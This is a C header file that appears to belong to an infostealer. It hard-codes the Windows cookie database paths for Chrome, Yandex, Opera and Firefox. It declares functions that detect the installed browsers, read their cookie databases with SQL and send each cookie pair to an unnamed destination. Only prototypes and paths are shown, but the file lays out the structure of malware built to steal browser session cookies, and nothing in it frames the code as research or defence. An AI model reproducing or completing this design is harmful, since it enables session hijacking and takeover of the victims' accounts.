#include "send.h"

#ifndef CH_PATH
 #define CH_PATH "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
#endif

#ifndef YA_PATH
 #define YA_PATH "AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies"
#endif

#ifndef OP_PATH
 #define OP_PATH "AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies"
#endif

#ifndef FF_PATH
 #define FF_PATH "AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
#endif


#ifndef browser_prediction

typedef struct {
        char*   user_path;
        uint8_t FF;
        uint8_t CH;
        uint8_t OP;
        uint8_t YA;
    } 
browser_prediction;
#endif

/* main.c prototypes. */

/* Will form Firefox cookies path from current path to ./Profiles. */
char* get_ff_cookies_path(char* curr_path);

/* Will check what browsers are installed already. */
browser_prediction check_browsers(char* local, char* roaming);

/* Will execute cookies databases reader for every browser installed. */
void collect_data(browser_prediction status);

/* Will read cookies databases. */
void get_sql(const char* sql_path, uint8_t bt);

/* Will send single cookie pair to some destination. */
uint8_t send_single_cookie(cookies_datatype* c_value);
